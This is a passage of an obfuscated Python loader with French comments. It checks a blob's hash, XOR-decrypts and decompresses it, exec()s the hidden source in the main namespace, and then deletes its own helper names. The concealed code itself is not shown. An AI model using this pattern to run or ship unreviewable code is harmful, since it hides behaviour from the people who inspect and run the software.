+ _cha5DruS3aW0dc + _cfrysE1UQFg1Z0 + _cdFlvYW4z_LDJH + _cnLY59qIdOdve8 + _cx9uGfpibUsBfy + _coiTxWGduq2AZO + _crBOuZ85o5kTxq + _cwMncuAyKD86vy + _chzrCAdhEdF81L + _cgTKcNolT4TdFE + _cccwMvKg47RqKx + _cjoTed2jBuwJQK + _czEeWN9WsQjlXu + _cuB0iS_F8zlusY + _czntsk7BLSgTmR + _cqcc65pxbR8lvi + _cnbfNcZAckt8tc + _crhMnT3XqL3lHS + _crPEy9aSogKxic + _czH45NJbgnudjv + _c_KnGipyNEDshc + _cxgOAYlTDYnJ5B + _cmNahZaMmEmGIk + _cef_djiKqvExf1 + _cpjqR5Oik9xbxe + _codbFcqc10nTjo + _cqnCkMl2rv8JpR + _ctQbnxXAonF4VL + _cjWALa2NPFi1Ar + _coEB3rUqM3ppnt + _cmTi_Nzeyhyfl6 + _cjchJXjVmpf5BJ + _ciIBju4NaBiGen + _cgokUE3K516Lss + _csYbZcb0Uuk9HT + _c_aIxPXnkZXJVp + _cc3Y5MuJa0gFF2 + _cmy7sOTYvtfzG1 + _ch3aI_7TDgq3Da + _chOz5LDP8C9n32 + _crfk37ZF3wKLla + _cktaTQY5sCSMbU + _chDxKBOu2NVyji + _cgbSSOcoCinUXV + _cxehFKBCuhM83S + _ctZM3TV6SCPB4z + _cxx2KZt7e9NYQd + _cf8Uu8AhpR_if9 + _coyMxW64wr7UYD + _cc475OvqE4oodA + _cvOJOAyoW4h_OK + _cbg09Npuhia_QT + _cjQgX67bgqEk8K + _cmBTXEl4H96jsn + _csFCrg034tuj5y + _cmjhxhYeeNI_hx + _cfQhmvOvXYc54w + _ceww3XC0IdSVaa + _cj6AzIXh2T23aw + _cnCJGsQ1_pwCzj + _ctZXzFbcEXjmAZ + _cbAh1EN0_H1Tto + _c_WTtgh5gENOvn + _czt1MPtCRxXobD + _c_sfn1eqsr9Co0 + _cd5Z4nL53iOZQd + _chGxuQ52yf9EIU + _cdq2eQkx5n_9kk + _cbEh66Qehwxnf5 + _cuoyb0883jw4fp + _cg1GqyMQoI5XoK + _cbIxCJ37pd5hjE + _ch0YsSZC3XYSpM + _czhxdMshGP64QY + _c_TEfSgEVNqcNX + _chjTPEEBXBRVjX + _ctzKxP2Vw47wlj + _ctnTcts9suHdsH + _cscp86Kw1aSoGO + _cz_esl3Lah3pC4 + _czQMZDfoTbtyx2 + _cjIre6cKzA82gc + _c_d4lc60QIaitC + _co3MRKqo24u2lI + _clVtvkOn0dN5GA + _clUFwru599CQkS + _cjJJfpsCvDOlB6 + _c_aLzicTWzVFA5 + _ctT3gv8Tt9462w + _cqVh4WQmlqzXeq + _cfzweG7Uf2itUP + _cj5tmt0TIjy3Hr + _crR7N__f7ugIem + _clSzKnWxdWbWwP + _ceX92b_vaZTEZa + _cyKp8oi0wKdJEZ + _cjafFKhTeZPsqp + _ckR4IiEJtGSSut + _cus3QWiugdz8Fa + _cvjNWDFRWcwC2B + _cy17z_rK_slUOs + _cjr99lWjMf5l2P + _cgPK1aZw1wVB_7 + _co7ZpOXuYpM2r1 + _cxnz84ZlxK6Raz + _ca06B9lXEEERkM + _cqe1crKf6SbiaJ + _cm7eJHR_JZj2Ri + _chmlDGh6WYF3Q8 + _crZjXZZlfo5kpb + _crZ1RVbtjKW9Hc + _clY8V4ey6TYeXG + _ccfJEex9IPWohP + _chCILl3iLDl_cL + _ccLz8vR6acHLId + _cmTQZx6B1FImTc + _cfEQqVs9J5fqQO + _ceRnJ2oBR4YGpA + _cxDTUgr1LAWbf2 + _cvRX5qdY0mORmf + _cpU2aAA77b1gnq + _cwOUsQIOU5XVzr)
if __import__('hashlib').sha256(_pvft5dGF9MGL57).hexdigest() != 'aafda96430296d59100344868ac8cc501b1971003a5195c2404713a145a301be':
    __import__('sys').exit(1)
_xaSj73r7uOutwx = bytes([91, 56, 118, 254, 233, 42, 198, 241, 197, 202, 139, 32, 89, 5, 203, 193, 149])
_fkzvDYQDX31ksrX = bytes([200, 80, 207, 21, 154, 173, 33, 114, 239, 229, 171, 204, 203, 84, 229, 232, 23])

def _fxmRTdcxVJgaSfV(_bkXrua3uufT8H4, _kmYL4V_U3IZE0e):
    return bytes(_bkXrua3uufT8H4[_igFKVBc1JQ3CLB] ^ _kmYL4V_U3IZE0e[_igFKVBc1JQ3CLB % len(_kmYL4V_U3IZE0e)] for _igFKVBc1JQ3CLB in range(len(_bkXrua3uufT8H4)))

def _fdpher1kPm9Tmfq(_typuVaWF4WRUld):
    import zlib
    return zlib.decompress(_typuVaWF4WRUld) # Un seul niveau de zlib ici pour simplifier

def _fejAHhyDUZnMktP():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xkKweQpkgQWTlM = _fxmRTdcxVJgaSfV(_pvft5dGF9MGL57, _xaSj73r7uOutwx)
    # 2. Décompression Zlib
    _dgLjKBD1k6LHFQ = _fdpher1kPm9Tmfq(_xkKweQpkgQWTlM)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dgLjKBD1k6LHFQ.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nnovmvC6ofBTFP = _main.__dict__
    _nnovmvC6ofBTFP.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nnovmvC6ofBTFP)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fejAHhyDUZnMktP()
try:
    del _fxmRTdcxVJgaSfV, _fdpher1kPm9Tmfq, _fejAHhyDUZnMktP
    del _pvft5dGF9MGL57, _xaSj73r7uOutwx, _fkzvDYQDX31ksrX
except:
    pass
